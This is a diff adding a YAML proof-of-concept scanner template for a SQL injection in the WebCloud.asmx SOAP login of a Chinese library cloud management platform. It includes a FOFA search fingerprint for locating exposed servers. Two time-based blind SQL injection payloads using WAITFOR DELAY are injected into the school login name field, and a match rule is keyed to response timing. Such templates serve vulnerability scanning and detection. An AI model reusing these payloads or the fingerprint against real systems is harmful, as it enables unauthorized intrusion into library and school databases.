@@ -1,0 +1,67 @@
+id: poc-yaml-cnedustar-webcloud-sqli
+info:
+  name: 科讯图书馆综合管理云平台WebCloud.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 图书馆云平台
+  fofa: body="科迅软件 版权所有"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /WebCloud.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"WebCloud/LibraryCloud"'
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <LibraryCloud xmlns="WebCloud">
+
+    <str>{"cmd":"login","schoolloginname":"1'';WAITFOR DELAY ''0:0:{{.t1}}''--","schoolpwd":"1"}</str>
+
+    <files>base64Binary</files>
+
+    </LibraryCloud>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(body,\"\
+    <LibraryCloudResult>\") &&\ncontains(body,\"<LibraryCloudResponse\") &&\ncontains(body,\"\
+    \\\"WebCloud\\\"\") \n"
+- method: POST
+  path: /WebCloud.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"WebCloud/LibraryCloud"'
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <LibraryCloud xmlns="WebCloud">
+
+    <str>{"cmd":"login","schoolloginname":"1'';WAITFOR DELAY ''0:0:{{.t3}}''--","schoolpwd":"1"}</str>
+
+    <files>base64Binary</files>
+
+    </LibraryCloud>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  expression: "status_code == 200 && \nduration >= t3 &&\nduration <= t4 &&\ncontains(body,\"\
+    <LibraryCloudResult>\") &&\ncontains(body,\"<LibraryCloudResponse\") &&\ncontains(body,\"\
+    \\\"WebCloud\\\"\")\n"
+transport: http
